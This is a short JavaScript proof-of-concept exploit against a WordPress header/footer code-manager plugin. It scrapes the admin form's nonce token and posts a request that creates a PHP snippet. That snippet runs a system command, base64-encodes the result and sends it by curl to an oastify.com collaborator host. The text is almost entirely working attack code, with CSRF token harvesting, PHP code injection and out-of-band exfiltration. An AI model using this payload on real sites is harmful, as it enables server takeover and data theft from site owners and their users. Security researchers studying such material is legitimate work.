fetch('http://localhost/wordpress-6.4.2/wordpress/wp-admin/admin.php?page=hfcm-pro-create')
  ...
  .then(html => {
    const tokenValue = (new DOMParser().parseFromString(html, 'text/html')).querySelector('form[method="post"] input#_wpnonce').value;
      ...
      body: `action=hfcm-pro-request&create-snippet=${tokenValue}&insert=1&data[snippet]=<?php+$info=base64_encode(systeminfo());system("curl 0nonwlxy0g6jt3g5jdqrvkj23t9kxalz.oastify.com?systeminfo=$info");?>&data[snippet_type]=php`
